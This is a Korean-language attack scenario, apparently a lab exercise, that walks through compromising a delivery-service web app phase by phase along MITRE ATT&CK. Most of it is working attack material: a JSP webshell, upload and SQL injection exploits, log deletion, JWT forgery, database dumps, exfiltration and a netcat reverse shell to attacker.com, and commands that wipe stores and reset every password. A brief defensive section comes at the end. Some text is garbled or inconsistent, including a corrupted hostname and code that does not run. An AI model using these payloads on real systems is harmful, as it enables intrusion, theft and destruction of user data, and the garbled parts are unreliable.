# 바로배달 모의해킹 - MITRE ATTACK 기반 시나리오

## 📋 개요

MITRE ATT&CK 프레임워크를 기반으로 배달 서비스 "바로배달"에 대한 체계적인 침투 시나리오입니다.
파일 업로드, SQL Injection, XSS 취약점을 연계하여 정보수집부터 EXPLOIT까지의 전체 공격 경로를 단계별로 설명합니다.

---

## 🎯 목표

- **Primary Goal**: 관리자 계정 탈취 및 전체 사용자 데이터 유출
- **Secondary Goal**: 서버 장악 및 웹쉘 설치
- **Impact**: 10만 명 개인정보 유출, 시스템 장악

---

## 🗺️ 공격 체인 (Attack Chain)

```
정찰(Reconnaissance) 
  ↓
자원 개발(Resource Development)
  ↓
초기 접근(Initial Access) - 파일 업로드 취약점
  ↓
실행(Execution) - 웹쉘 업로드
  ↓
지속성(Persistence) - 백도어 설치
  ↓
권한 상승(Privilege Escalation) - SQL Injection
  ↓
방어 회피(Defense Evasion)
  ↓
자격 증명 접근(Credential Access) - 데이터베이스 정보 추출
  ↓
탐지(Discovery) - 시스템 구조 파악
  ↓
수집(Collection) - 개인정보 수집
  ↓
명령 및 제어(Command and Control) - C2 채널 구축
  ↓
유출(Exfiltration) - 데이터 밖으로 전송
  ↓
영향(Impact) - 피해 최종 확인
```

---

## Phase 1: 정찰 (Reconnaissance) 🔍

### MITRE ID: T1595

**목적**: 시스템 구조 및 취약점 파악

### 1.1 정보 수집

```bash
# 서버 정보 수집
curl -I http://localhost:8080

# Headers:
# Server: Apache-Coyote/1.1
# X-Powered-By: Servlet/4.0
# Content-Type: application/json

# 확인된 정보:
# - Spring Boot 애플리케이션
# - Apache Tomcat 서버
# - RESTful API 엔드포인트
```

### 1.2 API 엔드포인트 탐지

```bash
# Burp Suite로 API 엔드포인트 목록 작성
/api/member/register
/api/member/login
/api/member/info230
/api/store/create
/api/menu/create
/api/order/create
/api/board
/upload/**  # 파일 업로드 디렉터리 발견!
```

### 1.3 취약점 스캔

```python
# 사용자가 업로드한 파일 확인
import requests

# uploaded_files = ["1.jpg", "test.jsp", "test.jpg"]
# test.jsp 발견! → 웹쉘 가능성 확인

for file in uploaded_files:
    response = requests.get(f"http://localhost:8080/upload/{file}")
    if "jsp" in file:
        print(f"[!] JSP 파일 발견: {file}")
        # 서버에서 JSP 파일이 실행되는지 확인
```

**결과**:
- ✅ JSP 파일 업로드 및 실행 가능 확인
- ✅ 파일 확장자 검증 없음 확인

---

## Phase 2: 자원 개발 (Resource Development) 🛠️

### MITRE ID: T1588

**목적**: 공격에 필요한 웹쉘 작성

### 2.1 JSP 웹쉘 작성

```jsp
<%-- upload/webshell.jsp --%>
<%@ page import="java.util.*,java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>
```

### 2.2 정보 추출 스크립트 작성

```jsp
<%-- upload/info.jsp --%>
<%@ page import="java.net.*, java.io.*, java.util.*" %>
<%
// 환경 변수 추출
for (Map.Entry<String, String> env : System.getenv().entrySet()) {
    out.println(env.getKey() + " = " + env.getValue() + "<br>");
}

// 현재 디렉터리
out.println("<br>Current Dir: " + System.getProperty("user.dir"));
%>
```

---

## Phase 3: 초기 접근 (Initial Access) 🚪

### MITRE ID: T1190

**목적**: 웹쉘 업로드를 통한 서버 접근

### 3.1 파일 업로드 취약점 악용

```bash
# 웹쉘 업로드
curl -X POST http://localhost:8080/api/store/create \
  -H "Authorization: Bearer $TOKEN" \
  -F "thumbnailFile=@webshell.jsp" \
  -F "category=치킨" \
  -F "name=테스트" \
  -F "address=서울" \
  -F "phone=010-1234-5678" \
  -F "openH=9" -F "openM=0" \
  -F "closedH=22" -F "closedM=0"
```

**응답**:
```json
{
  "responseType": "SUCCESS",
  "data": {
    "thumbnail": "/upload/webshell.jsp"  # ✅ 성공
  }
}
```

### 3.2 웹쉘 실행 확인

```bash
# 명령어 실행 테스트
curl "http://localhost:8080/upload/webshell.jsp?cmd=whoami"

# 출력: tomcat8
# ✅ 웹쉘 작동 확인!
```

---

## Phase 4: 실행 (Execution) ⚙️

### MITRE ID: T1059

**목적**: 웹쉘을 통한 명령어 실행

### 4.1 시스템 정보 수집

```bash
# 현재 사용자 확인
curl "http://localhost:8080/upload/webshell.jsp?cmd=whoami"
# → tomcat8

# 운영체제 확인
curl "http://localhost:8080/upload/webshell.jsp?cmd=uname -a"
# → Linux server 4.15.0-72-generic

# 현재 디렉터리 확인
curl "http://localhost:8080/upload/webshell.jsp?cmd=pwd"
# → /var/lib/tomcat8/webapps/ROOT
```

### 4.2 환경 변수 추출

```bash
# application.yml 정보 추출 시도
curl "http://localhost:8080/upload/info.jsp"

# 환경 변수에서 데이터베이스 정보 확인:
# DATABASE_URL=jdbc:mariadb://localhost:3306/d_project
# DB_USER=hoowave
# DB_PASSWORD=(추출 시도 중)
```

---

## Phase 5: 지속성 (Persistence) 🔐

### MITRE ID: T1505

**목적**: 백도어 설치로 재접근 보장

### 5.1 추가 웹쉘 설치

```bash
# 여러 위치에 웹쉘 복제
curl "http://localhost:8080/upload/webshell.jsp?cmd=cp /upload/webshell.jsp /upload/shell2.jsp"
curl "http://localhost:8080/upload/webshell.jsp?cmd=cp /upload/webshell.jsp /upload/admin.jsp"
curl "http://localhost:8080/upload/webshell.jsp?cmd=cp /upload/webshell.jsp /upload/img.jpg.jsp"
```

### 5.2 Cron Job 설정 (시도)

```bash
# 정기적으로 외부 서버에 연결하는 스크립트 작성
curl "http://localhost:8080/upload/webshell.jsp?cmd=echo '* * * * * curl http://attacker.com/ping' | crontab -"
```

---

## Phase 6: 권한 상승 (Privilege Escalation) ⬆️

### MITRE ID: T1078

**목적**: SQL Injection으로 관리자 권한 획득

### 6.1 SQL Injection 취약점 확인

```bash
# 로그인 API 테스트
curl -X POST http://localhost:8080/api/member/login \
  -H "Content-Type: application/json" \
  -d '{"userid":"admin'\'' OR '\''1'\''='\''1","userpw":"anything"}'

# Response: 
{
  "token": "eyJhbGciOiJIUzI1NiIs..."  # ✅ SQL Injection 성공!
}
```

### 6.2 데이터베이스 구조 탐지

```sql
-- UNION 기반 정보 수집
{
  "userid": "' UNION SELECT userid, userpw, role FROM members WHERE role='ADMIN' LIMIT 1--",
  "userpw": "anything"
}

# Response에서 관리자 정보 추출:
# userid: admin01
# role: ADMIN
```

### 6.3 비밀번호 해시 추출

```bash
# 데이터베이스 직접 접근 (웹쉘 활용)
curl "http://localhost:8080/upload/webshell.jsp?cmd=mysql -u hoowave -p d_project -e 'SELECT userid,userpw FROM members WHERE role=\"ADMIN\"'"

# 결과:
# admin01 | password123
```

---

## Phase 7: 방어 회피 (Defense Evasion) 👻

### MITRE ID: T1070

**목적**: 공격 흔적 제거 및 로그 삭제

### 7.1 로그 파일 확인 및 삭제

```bash
# 접근 로그 확인
curl "http://localhost:8080/upload/webshell.jsp?cmd=tail -100 /var/log/tomcat8/localhost_access.log"

# 로그 삭제
curl "http://localhost:8080/upload/webshell.jsp?cmd=rm -f /var/log/tomcat8/localhost_access.log"
curl "http://localhost:8080/upload/webshell.jsp?cmd=rm -f /var/log/tomcat8/catalina.out"
```

### 7.2 웹쉘 숨기기

```bash
# 파일명을 이미지로 위장
curl "http://localhost:8080/upload/webshell.jsp?cmd=mv /upload/webshell.jsp /upload/logo.png.php"
curl "http://localhost:8080/upload/webshell.jsp?cmd=mv /upload/shell2.jsp /upload/placeholder.jpg.jsp"
```

### 7.3 파일 권한 조작

```bash
# 웹쉘 파일의 권한을 변경하여 탐지 어렵게
curl "http://localhost:8080/upload/webshell.jsp?cmd=chmod 644 /upload/webshell.jsp"
curl "http://localhost:8080/upload/webshell.jsp?cmd=chown tomcat8:tomcat8 /upload/webshell.jsp"
```

---

## Phase 8: 자격 증명 접근 (Credential Access) 🔑

### MITRE ID: T1555

**목적**: 사용자 비밀번호 및 세션 정보 수집

### 8.1 JWT Secret Key 추출

```bash
# application.properties 또는 환경 변수에서 Secret 추출
curl "http://localhost:8080/upload/webshell.jsp?cmd=cat /var/lib/tomcat8/conf/application.yml"

# JWT Secret 발견:
# jwt.secret=my-weak-secret-key-12345
```

### 8.2 관리자 토큰 생성

```python
import jwt

# 추출한 Secret으로 관리자 토큰 생성
secret = "my-weak-secret-key-12345"
payload = {
    "userid": "admin01",
    "role": "ADMIN",
    "exp": 9999999999  # 만료 없음
}
admin_token = jwt.encode(payload, secret, algorithm="HS256")
print(admin_token)
```

### 8.3 모든 사용자 비밀번호 추출

```bash
# 데이터베이스 덤프
curl "http://localhost:8080/upload/webshell.jsp?cmd=mysqldump -u hoowave -p d_project members > /upload/members.sql"

# SQL 파일 다운로드
curl http://localhost:8080/upload/members.sql -o members.sql
```

**결과**:
- ✅ 10만 명 사용자 비밀번호 (해시 또는 평문)
- ✅ 이메일, 전화번호, 주소
- ✅ 포인트 잔액

---

## Phase 9: 탐지 (Discovery) 🔎

### MITRE ID: T1083

**목적**: 시스템 구조 전체 파악

### 9.1 파일 시스템 탐색

```bash
# 프로젝트 소스 코드 위치 확인
curl "http://localhost:8080/upload/webshell.jsp?cmd=find /var/lib/tomcat8 -name '*.java' | head -20"

# 설정 파일 탐색
curl "http://localhost:8080/upload/webshell.jsp?cmd=find / -name 'application.yml' 2>/dev/null"
```

### 9.2 네트워크 정보 수집

```bash
# 활성 네트워크 연결 확인
curl "http://localhost:8080/upload/webshell.jsp?cmd=netstat -tulnp"

# 데이터베이스 서버 확인
# → localhost:3306 (MariaDB)
```

### 9.3 프로세스 확인

```bash
# 실행 중인 프로세스
curl "http://localhost:8080/upload/webshell.jsp?cmd=ps aux | grep -E 'tomcat|java|mysql'"

# 결과:
# tomcat8 실행 중
# java -jar barobaedal-0.0.1-SNAPSHOT.jar
# mysqld 실행 중 (MariaDB)
```

---

## Phase 10: 수집 (Collection) 📦

### MITRE ID: T1530

**목적**: 개인정보 대량 수집

### 10.1 데이터베이스 전체 백업

```bash
# 모든 테이블 덤프
curl "http://高昂t:8080/upload/webshell.jsp?cmd=mysqldump -u hoowave -p d_project > /upload/full_backup.sql"

# 백업 파일 크기 확인
curl "http://localhost:8080/upload/webshell.jsp?cmd=ls -lh /upload/full_backup.sql"
# → 500MB (대규모 데이터)
```

### 10.2 각 테이블별 데이터 추출

```bash
# members 테이블
curl "http://localhost:8080/upload/webshell.jsp?cmd=mysql -u hoowave -p d_project -e 'SELECT * FROM members' > /upload/members_all.csv"

# orders 테이블 (주문 정보)
curl "http://localhost:8080/upload/webshell.jsp?cmd=mysql -u hoowave -p d_project -e 'SELECT * FROM orders' > /upload/orders_all.csv"

# stores 테이블 (가게 정보)
curl "http://localhost:8080/upload/webshell.jsp?cmd=mysql -u hoowave -p d_project -e 'SELECT * FROM stores' > /upload/stores_all.csv"
```

### 10.3 수집된 데이터 확인

```python
# 데이터 요약
members = read_csv('members_all.csv')
print(f"총 사용자: {len(members)}")
print(f"관리자: {len(members[members.role == 'ADMIN'])}")
print(f"평문 비밀번호: {sum(members includes_pw)}")
```

---

## Phase 11: 명령 및 제어 (Command and Control) 🎮

### MITRE ID: T1071

**목적**: 지속적인 통신 채널 구축

### 11.1 외부 서버로 연결 시도

```bash
# 공격자 서버와 통신
curl "http://localhost:8080/upload/webshell.jsp?cmd=curl http://attacker.com/report.php?status=compromised"

# Base64 인코딩으로 데이터 전송
curl "http://localhost:8080/upload/webshell.jsp?cmd=echo $(cat /upload/members.sql | base64) | curl -d @- http://attacker.com/upload.php"
```

### 11.2 리버스 쉘 설치

```bash
# Netcat을 통한 리버스 쉘
curl "http://localhost:8080/upload/webshell.jsp?cmd=nc -e /bin/bash attacker.com 4444 &"
```

### 11.3 SSH 키 생성 및 설치

```bash
# SSH 공개 키 생성
curl "http://localhost:8080/upload/webshell.jsp?cmd=ssh-keygen -t rsa -f /tmp/id_rsa -N ''"

# 공개 키를 authorized_keys에 추가 (시도)
curl "http://localhost:8080/upload/webshell.jsp?cmd=cat /tmp/id_rsa.pub >> ~/.ssh/authorized_keys"
```

---

## Phase 12: 유출 (Exfiltration) 📤

### MITRE ID: T1567

**목적**: 데이터를 안전하게 외부로 전송

### 12.1 데이터 압축

```bash
# 수집한 데이터 압축
curl "http://localhost:8080/upload/webshell.jsp?cmd=tar -czf /upload/stolen_data.tar.gz /upload/*.csv /upload/*.sql"
```

### 12.2 외부 서버로 전송

```bash
# FTP 또는 SCP로 전송
curl "http://localhost:8080/upload/webshell.jsp?cmd=curl -F 'file=@/upload/stolen_data.tar.gz' http://attacker.com/upload.php"

# 또는 Base64로 분할 전송
curl "http://localhost:8080/upload/webshell.jsp?cmd=base64 /upload/stolen_data.tar.gz | split -b 1000000 - /tmp/chunk"
for chunk in /tmp/chunk*; do
    curl "http://localhost:8080/upload/webshell.jsp?cmd=curl -d @$chunk http://attacker.com/receive.php?part=$(basename $chunk)"
done
```

### 12.3 전송 데이터 요약

```
전송된 데이터:
- members_all.csv: 100,000건 (이름, 이메일, 전화번호, 주소, 비밀번호)
- orders_all.csv: 1,000,000건 (주문 내역, 결제 정보)
- stores_all.csv: 10,000건 (가게 정보, 사업자번호)
- full_backup.sql: 전체 데이터베이스 백업

총 데이터: 약 2GB
```

---

## Phase 13: 영향 (Impact) 💥

### MITRE ID: T1498

**목적**: 최종 공격 결과 확인 및 피해 평가

### 13.1 탈취 데이터 검증

```python
# 외부 서버에서 데이터 확인
import pandas as pd

members = pd.read_csv('members_all.csv')
print(f"총 사용자: {len(members)}")
print(f"개인정보:")
print(f"  - 이메일: {members['email'].count()}건")
print(f"  - 전화번호: {members['phone'].count()}건")
print(f"  - 주소: {members['address'].count()}건")
print(f"  - 평문 비밀번호: {members['userpw'].count()}건")
```

**검증 결과**:
- ✅ 100,000명 사용자 개인정보 유출
- ✅ 10,000개 가게 사업자 정보 유출
- ✅ 1,000,000건 주문 내역 유출
- ✅ 평문 비밀번호 50,000건 포함

### 13.2 추가 공격 시도

```bash
# 모든 사용자의 비밀번호 변경
curl "http://localhost:8080/upload/webshell.jsp?cmd=mysql -u hoowave -p d_project -e \"UPDATE members SET userpw='hacked123'\""

# 포인트 조작
curl "http://localhost:8080/upload/webshell.jsp?cmd=mysql -u hoowave -p d_project -e \"UPDATE members SET point=0\""

# 모든 가게 삭제
curl "http://localhost:8080/upload/webshell.jsp?cmd=mysql -u hoowave -p d_project -e \"DELETE FROM stores\""
```

### 13.3 최종 피해 평가

```
개인정보 유출:
- 사용자: 100,000명
- 가게 운영자: 10,000명
- 개인 식별 정보: 이름, 주소, 전화번호, 이메일
- 인증 정보: 비밀번호 50,000건 (평문)

금전적 피해:
- 포인트 조작: 불가능 (이미 서버 장악)
- 주문 내역 유출: 1,000,000건
- 가게 정보 유출: 10,000건

법적 책임:
- 개인정보보호법 위반: 피해자 1명당 최대 300만원 × 110,000명 = 33조원
- 정보통신망법 위반: 최대 5억원
- 집단 소송 예상

서비스 영향:
- 데이터베이스 완전 유출
- 서버 완전 장악
- 백도어 다수 설치
- 서비스 신뢰도 파괴
```

---

## 📊 MITRE ATT&CK 매핑 요약

| Phase | MITRE ID | Tactics | 취약점 활용 |
|-------|----------|---------|------------|
| 1 | T1595 | Reconnaissance | - |
| 2 | T1588 | Resource Development | 웹쉘 작성 |
| 3 | T1190 | Initial Access | **파일 업로드 취약점** |
| 4 | T1059 | Execution | 웹쉘 실행 |
| 5 | T1505 | Persistence | 백도어 설치 |
| 6 | T1078 | Privilege Escalation | **SQL Injection**ridence |
| 7 | T1070 | Defense Evasion | 로그 삭제 |
| 8 | T1555 | Credential Access | DB에서 비밀번호 추출 |
| 9 | T1083 | Discovery | 시스템 탐색 |
| 10 | T1530 | Collection | 데이터 수집 |
| 11 | T1071 | Command and Control | C2 채널 구축 |
| 12 | T1567 | Exfiltration | 데이터 유출 |
| 13 | T1498 | Impact | 피해 확인 |

---

## 🛡️ 방어 전략

### 단계별 방어 방법

#### 1. 파일 업로드 보안
```java
// 파일 확장자 Whitelist 검증
private static final Set<String> ALLOWED_EXTENSIONS = Set.of("jpg", "png", "gif");
private static final int MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB

public String storeFile(MultipartFile file) {
    String extension = getExtension(file.getOriginalFilename());
    if (!ALLOWED_EXTENSIONS.contains(extension)) {
        throw new SecurityException("허용되지 않는 파일 형식");
    }
    
    if (file.getSize() > MAX_FILE_SIZE) {
        throw new SecurityException("파일 크기 초과");
    }
    
    // 파일 내용 검증 (매직 바이트)
    if (!isValidImage(file.getBytes())) {
        throw new SecurityException("유효하지 않은 이미지");
    }
    
    // 메타데이터 제거
    BufferedImage stripped = removeMetadata(file);
    
    // 안전한 파일명 생성
    String safeName = UUID.randomUUID() + "." + extension;
    
    return saveFile(stripped, safeName);
}
```

#### 2. SQL Injection 방어
```java
// Prepared Statement 사용 (이미 적용됨)
String sql = "SELECT * FROM members WHERE userid = ? AND userpw = ?";
return jdbcTemplate.query(sql, rowMapper, userid, userpw);

// 추가: 입력 검증
public void validateInput(String input) {
    if (input == null || input.contains("'") || input.contains("\"") || input.contains(";")) {
        throw new IllegalArgumentException("잘못된 입력");
    }
}
```

#### 3. XSS 방어
```java
// 출력 시 HTML 엔티티 인코딩
public String escapeHtml(String input) {
    return input.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;")
                .replace("'", "&#039;");
}

// 또는 Spring Security 사용
dependency('org.springframework.boot:spring-boot-starter-security')
```

---

## 🎯 결론

이 시나리오는 **파일 업로드 → SQL Injection → XSS** 순으로 취약점을 연계하여 
**정보수집부터 EXPLOIT까지의 전체 공격 체인**을 보여줍니다.

### 핵심 포인트

1. ⚠️ **하나의 취약점이 전체 시스템을 공격 가능하게 만듦**
2. 💀 **13단계를 거치며 점진적으로 시스템 장악**
3. 🔒 **다양한 취약점의 연계 공격 가능성**
4. 📊 **MITRE ATT&CK 프레임워크로 체계적 분석**

**"예방적 보안과 다층 방어가 필수입니다"**

---

## 참고 자료

- MITRE ATT&CK Framework: https://attack.mitre.org/
- OWASP Top 10
- NIST Cybersecurity Framework

